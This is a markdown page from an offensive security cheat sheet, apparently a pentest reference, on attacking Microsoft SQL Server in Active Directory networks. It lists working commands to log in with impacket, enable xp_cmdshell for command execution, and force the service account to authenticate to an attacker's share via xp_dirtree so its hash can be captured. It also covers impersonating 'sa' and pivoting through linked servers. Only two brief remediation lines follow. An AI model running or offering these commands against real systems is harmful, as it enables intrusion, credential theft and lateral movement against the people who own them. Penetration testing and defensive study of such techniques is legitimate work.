---
tags:
  - Network
  - Windows
---

# :material-database-lock: MSSQL Attacks

<span class="pill pill-hard">→ RCE + AD</span> <span class="pill pill-info">network</span>

Microsoft SQL Server is everywhere in AD estates. It offers command execution, credential capture, and lateral movement across linked servers.

!!! abstract "TL;DR"
    Authenticate (SQL or Windows auth), enable `xp_cmdshell` for RCE, relay/capture the service account's hash, and hop through `EXECUTE AS`/linked servers.

## :material-login: Connect & enumerate

```bash
impacket-mssqlclient CORP/user:pass@10.10.10.5 -windows-auth
# in the shell:
SELECT system_user;  enum_db;  enum_links;
```

## :material-console: RCE via xp_cmdshell

```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## :material-lan-connect: Steal the service hash

```sql
-- coerce the SQL service account to auth to you; capture with Responder/ntlmrelayx
EXEC master..xp_dirtree '\\10.10.14.1\share';
EXEC master..xp_subdirs '\\10.10.14.1\x';
```

## :material-source-branch: Linked servers & impersonation

```sql
EXECUTE AS LOGIN = 'sa';                                   -- impersonate
SELECT * FROM OPENQUERY("LINKED\SRV", 'select system_user');  -- hop
```

!!! loot "MSSQL creds are AD creds"
    The service account often has domain reach; a captured/relayed hash feeds straight into [NTLM Relay](ntlm-relay.md) and [Active Directory](active-directory.md).

## :material-shield-check: Remediation

- Keep `xp_cmdshell` disabled; least-privilege service accounts (no local admin).
- Disable unneeded linked servers; enforce SMB signing to block relay.

## :material-link-variant: Related

- Coerced hashes → [NTLM Relay](ntlm-relay.md); domain context → [Active Directory](active-directory.md).
- Reached via web [SQL Injection](../web/sqli.md); shell → [Windows Privesc](../privesc/windows.md).
- Reference: [HackTricks MSSQL](https://book.hacktricks.wiki/).
